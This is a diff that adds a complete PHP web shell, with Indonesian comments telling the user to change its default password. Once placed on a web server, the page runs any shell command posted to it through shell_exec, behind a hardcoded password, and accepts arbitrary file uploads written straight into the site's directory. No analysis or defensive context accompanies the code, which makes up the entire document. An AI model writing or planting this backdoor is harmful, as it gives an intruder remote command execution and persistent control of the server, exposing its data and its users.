@@ -1,0 +1,26 @@
+<?php
+// === SIMPLE WEB SHELL ===
+// Ganti password di bawah!
+$password = "gantipassword123";
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['pass'] === $password) {
+    if (isset($_POST['cmd'])) {
+        echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
+    }
+    if (isset($_FILES['file'])) {
+        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+        echo "Upload berhasil: " . $_FILES['file']['name'];
+    }
+} else {
+    ?>
+    <form method="POST">
+        Password: <input type="password" name="pass"><br><br>
+        Command: <input type="text" name="cmd" size="50"><br>
+        <input type="submit" value="Run">
+        <hr>
+        <input type="file" name="file">
+        <input type="submit" value="Upload">
+    </form>
+    <?php
+}
+?>
